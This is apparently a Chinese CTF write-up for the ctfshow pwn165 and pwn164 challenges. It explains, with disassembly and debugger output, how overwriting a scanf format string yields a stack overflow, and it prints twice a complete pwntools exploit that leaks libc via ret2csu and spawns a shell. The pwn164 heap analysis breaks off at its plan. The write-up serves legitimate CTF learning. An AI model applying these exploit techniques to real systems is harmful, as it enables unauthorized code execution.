<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:0000000000400F0D loc_400F0D:                             ; CODE XREF: main:loc_401013↓j<br>.text:0000000000400F0D                 mov     edi, offset asc_401637 ; &quot;&gt; &quot;<br>.text:0000000000400F12                 mov     eax, 0<br>.text:0000000000400F17                 call    printf<br>.text:0000000000400F1C                 lea     rdx, [rbp+var_14]<br>.text:0000000000400F20                 mov     rax, [rbp+var_10] ;利用rbp寻址，var_10就是v5,那么我们就可以将v5的%d修改为%256s<br>.text:0000000000400F24                 mov     rsi, rdx<br>.text:0000000000400F27                 mov     rdi, rax<br>.text:0000000000400F2A                 mov     eax, 0<br>.text:0000000000400F2F                 call    __isoc99_scanf<br>.text:0000000000400F34                 test    eax, eax<br>.text:0000000000400F36                 jg      short loc_400F42<br>.text:0000000000400F38                 mov     edi, 0          ; status<br>.text:0000000000400F3D                 call    exit<br></code></pre></td></tr></table></figure>

<p>这里的一参是用rbp寻址的，那么我们就可以通过off by null修改这一值为%256s来打ret2csu来泄露libc，后面直接相同步骤getshell了</p>
<blockquote>
<p>(为什么不打ret2libc，因为puts_plt表里的值为400A00会被__isoc99_scanf截断，ret2csu我们是只需要got的)</p>
</blockquote>
<p>先贴一下exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span>*<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>psl = <span class="hljs-keyword">lambda</span> data : p.sendline(data)<br>ps = <span class="hljs-keyword">lambda</span> data : p.send(data)<br>pc = <span class="hljs-keyword">lambda</span> data : p.recvuntil(data)<br>ph = <span class="hljs-keyword">lambda</span> data : <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(data))<br>uu64 = <span class="hljs-keyword">lambda</span> : u64(pc(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>::].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>binary_name = <span class="hljs-string">&#x27;./pwn165&#x27;</span><br>HOST = <span class="hljs-string">&quot;pwn.challenge.ctf.show&quot;</span><br>PORT =  <span class="hljs-number">28191</span><br>choice = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Please input yes-&gt;Process,no-&gt;Remote&quot;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;y&quot;</span> <span class="hljs-keyword">in</span> choice:<br>    p = process(binary_name)<br><span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;n&quot;</span> <span class="hljs-keyword">in</span> choice:<br>    p = remote(HOST,PORT)<br><br>e = ELF(binary_name)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bug</span>():<br>    gdb.attach(p)<br>    pause()<br><br><span class="hljs-comment"># ========== Exploit 开始 ==========</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">data</span>):<br>    pc(<span class="hljs-string">&quot;&gt;&quot;</span>)<br>    psl(<span class="hljs-built_in">str</span>(data))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">data</span>):<br>    cmd(<span class="hljs-number">1</span>)<br>    pc(<span class="hljs-string">&quot;Note:&quot;</span>)<br>    ps(data)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    cmd(<span class="hljs-number">2</span>)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">save</span>():<br>    cmd(<span class="hljs-number">3</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">change</span>(<span class="hljs-params">ID</span>):<br>    cmd(<span class="hljs-number">4</span>)<br>    pc(<span class="hljs-string">&quot;Input your ID:&quot;</span>)<br>    psl(<span class="hljs-built_in">str</span>(ID))       <br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    gadget1=<span class="hljs-number">0x401060</span><br>    gadget2=<span class="hljs-number">0x40107a</span><br>    rdi = <span class="hljs-number">0x00000000401083</span><br>    ret = <span class="hljs-number">0x00000000004009b1</span><br>    fmt = <span class="hljs-number">0x401619</span><br>    puts_plt = <span class="hljs-number">0x400A00</span><br>    puts_got = e.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>    main = <span class="hljs-number">0x400EB0</span><br>    <br>    p.recvuntil(<span class="hljs-string">&quot;Input your ID:&quot;</span>)<br>    psl(<span class="hljs-built_in">str</span>(<span class="hljs-string">&quot;jian&quot;</span>))    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[5;32m[+]=====put the fmt into rbp-0x10=====\033[0m&quot;</span>)<br>    p1 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xa8</span>+p64(fmt)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><br>    <br>    edit(p1.ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[5;32m[+]=====start ret2csu=====\033[0m&quot;</span>)<br>    <br>    p2 = <span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x64</span>)+p64(gadget2)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">1</span>)+p64(e.got[<span class="hljs-string">&#x27;puts&#x27;</span>])+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(e.got[<span class="hljs-string">&#x27;puts&#x27;</span>])+p64(gadget1)+<span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x38</span>)+p64(main)<br>    psl(p2.ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;a&#x27;</span>))<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[5;32m[+]=====leak the libc=====\033[0m&quot;</span>)<br>    <br>    puts_addr = uu64()<br>    ph(puts_addr)<br>    libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>    base = puts_addr - libc.sym[<span class="hljs-string">&quot;puts&quot;</span>]<br>    system = base + libc.sym[<span class="hljs-string">&quot;system&quot;</span>]<br>    binsh = base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">&quot;/bin/sh&quot;</span>))<br>    ph(base)<br>    ph(system)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[5;32m[+]=====get shell=====\033[0m&quot;</span>)<br>    <br>    p.recvuntil(<span class="hljs-string">&quot;Input your ID:&quot;</span>)<br>    psl(<span class="hljs-built_in">str</span>(<span class="hljs-string">&quot;jian&quot;</span>))<br>    p1 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xa8</span>+p64(fmt)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><br>    <br>    edit(p1.ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    <br>    p3 = <span class="hljs-string">b&#x27;w&#x27;</span>*<span class="hljs-number">0x64</span> +p64(rdi)+p64(binsh)+p64(system)<br>    psl(p3.ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;a&#x27;</span>))        <br>    <span class="hljs-comment">#bug()</span><br>    <br>    <br>exp()<br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>修改v5 &#x3D; %256s</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">00:0000│ rsp 0x7fffffffde48 ◂— 0x6161616161616161 (&#x27;aaaaaaaa&#x27;)<br>... ↓        20 skipped<br>15:00a8│-058 0x7fffffffdef0 —▸ 0x401619 ◂— and eax, 0x73363532 /* &#x27;%256s&#x27;的地址 */<br>16:00b0│-050 0x7fffffffdef8 ◂— 0<br>... ↓        9 skipped<br>20:0100│ rbp 0x7fffffffdf48 —▸ 0x7fffffffdf00 ◂— 0 ;寻址是rbp-0x10所以要在0x7fffffffdef0布置&#x27;%256s&#x27;的地址<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs assembly"> RAX  0x401619 ◂— and eax, 0x73363532 /* &#x27;%256s&#x27; */ ;后面会赋值给rdi<br> RBX  0<br> RCX  0x7ffff72f73c0 (write+16) ◂— cmp rax, -0xfff<br> RDX  0x7fffffffdeec ◂— 0x40161961616161<br> RDI  1<br>*RSI  0x7fffffffdeec ◂— 0x40161961616161<br> R8   0x7ffff7fde700 ◂— 0x7ffff7fde700<br> R9   2<br> R10  0x6161616161616161 (&#x27;aaaaaaaa&#x27;)<br> R11  0x246<br> R12  0x400a70 ◂— xor ebp, ebp<br> R13  0x7fffffffe010 ◂— 1<br> R14  0<br> R15  0<br> RBP  0x7fffffffdf00 ◂— 0 ;注意此时rbp为0x7fffffffdf00<br> RSP  0x7fffffffdf58 —▸ 0x400eb0 ◂— push rbp<br>*RIP  0x400f27 ◂— mov rdi, rax<br>────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────────────<br>   0x400f12    mov    eax, 0                       EAX =&gt; 0<br>   0x400f17    call   printf@plt                  &lt;printf@plt&gt;<br> <br>   0x400f1c    lea    rdx, [rbp - 0x14]               RDX =&gt; 0x7fffffffdeec ◂— 0x40161961616161<br>   0x400f20    mov    rax, qword ptr [rbp - 0x10]     RAX, [0x7fffffffdef0] =&gt; 0x401619 ◂— and eax, 0x73363532 /* &#x27;%256s&#x27; */<br>   0x400f24    mov    rsi, rdx                        RSI =&gt; 0x7fffffffdeec ◂— 0x40161961616161<br> ► 0x400f27    mov    rdi, rax                        RDI =&gt; 0x401619 ◂— and eax, 0x73363532 /* &#x27;%256s&#x27; */<br>   0x400f2a    mov    eax, 0                          EAX =&gt; 0<br>   0x400f2f    call   __isoc99_scanf@plt          &lt;__isoc99_scanf@plt&gt;<br></code></pre></td></tr></table></figure>

<p>至于p2的偏移为什么是0x64，请看下文</p>
<p>这是调试到我们修改完v5 &#x3D; %256s之后，rsp指向的返回地址为0x400f73,记住这<code>rsp 0x7fffffffdf50</code></p>
<p class='item-img' data-src='https://github.com/langx1ng/-/blob/main/image-20251130232121828.png?raw=true'><img src="https://github.com/langx1ng/-/blob/main/image-20251130232121828.png?raw=true" alt="ctfshow165"></p>
<p>继续执行到下一次读入选项</p>
<p class='item-img' data-src='https://github.com/langx1ng/-/blob/main/image-20251130232419399.png?raw=true'><img src="https://github.com/langx1ng/-/blob/main/image-20251130232419399.png?raw=true" alt="ctfshowpwn165"></p>
<p>此时我们读入的地址为0x7fffffffdeec,刚好0x7fffffffdf50-0x7fffffffdeec &#x3D; 0x64</p>
<p>si进去调到最后,可以看见此时的返回地址也是0x7fffffffdf50，所以偏移就是0x64</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x7ffff726b646 &lt;__isoc99_scanf+358&gt;    ret                                &lt;0x40107a&gt;<br>-------------------------------<br>stack<br>00:0000│ rsp 0x7fffffffdf50 —▸ 0x40107a ◂— pop rbx<br></code></pre></td></tr></table></figure>

<p>后面的话就是正常的ret2csu了就不讲了</p>
<p>最后在贴一下exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span>*<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>psl = <span class="hljs-keyword">lambda</span> data : p.sendline(data)<br>ps = <span class="hljs-keyword">lambda</span> data : p.send(data)<br>pc = <span class="hljs-keyword">lambda</span> data : p.recvuntil(data)<br>ph = <span class="hljs-keyword">lambda</span> data : <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(data))<br>uu64 = <span class="hljs-keyword">lambda</span> : u64(pc(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>::].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>binary_name = <span class="hljs-string">&#x27;./pwn165&#x27;</span><br>HOST = <span class="hljs-string">&quot;pwn.challenge.ctf.show&quot;</span><br>PORT =  <span class="hljs-number">28191</span><br>choice = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Please input yes-&gt;Process,no-&gt;Remote&quot;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;y&quot;</span> <span class="hljs-keyword">in</span> choice:<br>    p = process(binary_name)<br><span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;n&quot;</span> <span class="hljs-keyword">in</span> choice:<br>    p = remote(HOST,PORT)<br><br>e = ELF(binary_name)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bug</span>():<br>    gdb.attach(p)<br>    pause()<br><br><span class="hljs-comment"># ========== Exploit 开始 ==========</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">data</span>):<br>    pc(<span class="hljs-string">&quot;&gt;&quot;</span>)<br>    psl(<span class="hljs-built_in">str</span>(data))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">data</span>):<br>    cmd(<span class="hljs-number">1</span>)<br>    pc(<span class="hljs-string">&quot;Note:&quot;</span>)<br>    ps(data)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    cmd(<span class="hljs-number">2</span>)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">save</span>():<br>    cmd(<span class="hljs-number">3</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">change</span>(<span class="hljs-params">ID</span>):<br>    cmd(<span class="hljs-number">4</span>)<br>    pc(<span class="hljs-string">&quot;Input your ID:&quot;</span>)<br>    psl(<span class="hljs-built_in">str</span>(ID))       <br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    gadget1=<span class="hljs-number">0x401060</span><br>    gadget2=<span class="hljs-number">0x40107a</span><br>    rdi = <span class="hljs-number">0x00000000401083</span><br>    ret = <span class="hljs-number">0x00000000004009b1</span><br>    fmt = <span class="hljs-number">0x401619</span><br>    puts_plt = <span class="hljs-number">0x400A00</span><br>    puts_got = e.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>    main = <span class="hljs-number">0x400EB0</span><br>    <br>    p.recvuntil(<span class="hljs-string">&quot;Input your ID:&quot;</span>)<br>    psl(<span class="hljs-built_in">str</span>(<span class="hljs-string">&quot;jian&quot;</span>))    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[5;32m[+]=====put the fmt into rbp-0x10=====\033[0m&quot;</span>)<br>    p1 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xa8</span>+p64(fmt)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><br>    <br>    edit(p1.ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[5;32m[+]=====start ret2csu=====\033[0m&quot;</span>)<br>    <br>    p2 = <span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x64</span>)+p64(gadget2)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">1</span>)+p64(e.got[<span class="hljs-string">&#x27;puts&#x27;</span>])+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(e.got[<span class="hljs-string">&#x27;puts&#x27;</span>])+p64(gadget1)+<span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x38</span>)+p64(main)<br>    psl(p2.ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;a&#x27;</span>))<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[5;32m[+]=====leak the libc=====\033[0m&quot;</span>)<br>    <br>    puts_addr = uu64()<br>    ph(puts_addr)<br>    libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>    base = puts_addr - libc.sym[<span class="hljs-string">&quot;puts&quot;</span>]<br>    system = base + libc.sym[<span class="hljs-string">&quot;system&quot;</span>]<br>    binsh = base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">&quot;/bin/sh&quot;</span>))<br>    ph(base)<br>    ph(system)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[5;32m[+]=====get shell=====\033[0m&quot;</span>)<br>    <br>    p.recvuntil(<span class="hljs-string">&quot;Input your ID:&quot;</span>)<br>    psl(<span class="hljs-built_in">str</span>(<span class="hljs-string">&quot;jian&quot;</span>))<br>    p1 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xa8</span>+p64(fmt)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><br>    <br>    edit(p1.ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    <br>    p3 = <span class="hljs-string">b&#x27;w&#x27;</span>*<span class="hljs-number">0x64</span> +p64(rdi)+p64(binsh)+p64(system)<br>    psl(p3.ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;a&#x27;</span>))        <br>    <span class="hljs-comment">#bug()</span><br>    <br>    <br>exp()<br>p.interactive()<br></code></pre></td></tr></table></figure>



<h1 id="ctfshow-pwn-164"><a href="#ctfshow-pwn-164" class="headerlink" title="ctfshow-pwn-164"></a>ctfshow-pwn-164</h1><p>这是一道2.27的堆题</p>
<p>main:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __fastcall __noreturn <span class="hljs-title function_">main</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">char</span> **a2, <span class="hljs-type">char</span> **a3)</span><br>&#123;<br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// eax</span><br><br>  sub_A5C(a1, a2, a3);<br>  sub_AD0();<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    menu();<br>    v3 = his_read();<br>    <span class="hljs-keyword">switch</span> ( v3 )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        delete();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1433233</span>:<br>        transform();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        add();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">default</span>:<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Invalid Choice&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>add():</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">add</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size; <span class="hljs-comment">// [rsp+4h] [rbp-Ch]</span><br>  <span class="hljs-type">size_t</span> size_4; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  size_4 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Size?&quot;</span>);<br>  size = his_read();<br>  ptr = <span class="hljs-built_in">realloc</span>(ptr, size);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Content?&quot;</span>);<br>  read(<span class="hljs-number">0</span>, ptr, size);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Done&quot;</span>);<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28u</span>) ^ size_4;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>delete():</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">sub_C2C</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> __int64 v1; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v1 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  <span class="hljs-built_in">free</span>(ptr);                                    <span class="hljs-comment">// uaf</span><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Done&quot;</span>);<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28u</span>) ^ v1;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>transform:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">sub_9F9</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> __int64 v1; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v1 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  <span class="hljs-keyword">if</span> ( dword_202050 )<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>  dword_202050 = <span class="hljs-number">1</span>;<br>  ptr = <span class="hljs-number">0LL</span>;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Done&quot;</span>);<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28u</span>) ^ v1;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>掌握的信息：</p>
<ul>
<li><p>delete函数中存在uaf的，</p>
</li>
<li><p>libc为2.27最初的一版，可以直接double free，</p>
</li>
<li><p>程序用realloc来申请chunk的。</p>
</li>
<li><p>transform可以把ptr&#x3D;0，但是只有一次机会</p>
</li>
</ul>
<p>这里先提一下realloc的特性：</p>
<blockquote>
<ul>
<li>当<code>ptr == nullptr</code>的时候，相当于<code>malloc(size)</code>， 返回分配到的地址</li>
<li>当<code>ptr != nullptr &amp;&amp; size == 0</code>的时候，相当于<code>free(ptr)</code>，返回空指针</li>
<li>当<code>size</code>小于原来<code>ptr</code>所指向的内存的大小时，直接缩小，返回<code>ptr</code>指针。被削减的那块内存会被释放，放入对应的<code>bins</code>中去</li>
<li>当<code>size</code>大于原来<code>ptr</code>所指向的内存的大小时，如果原<code>ptr</code>所指向的<code>chunk</code>后面又足够的空间，那么直接在后面扩容，返回<code>ptr</code>指针；如果后面空间不足，先释放<code>ptr</code>所申请的内存，然后试图分配<code>size</code>大小的内存，返回分配后的指针</li>
</ul>
</blockquote>
<p>根据realloc的特性我们可以将ptr&#x3D;0，达到申请多个chunk的目的，还可以进行溢出</p>
<p>思路：</p>
<ol>
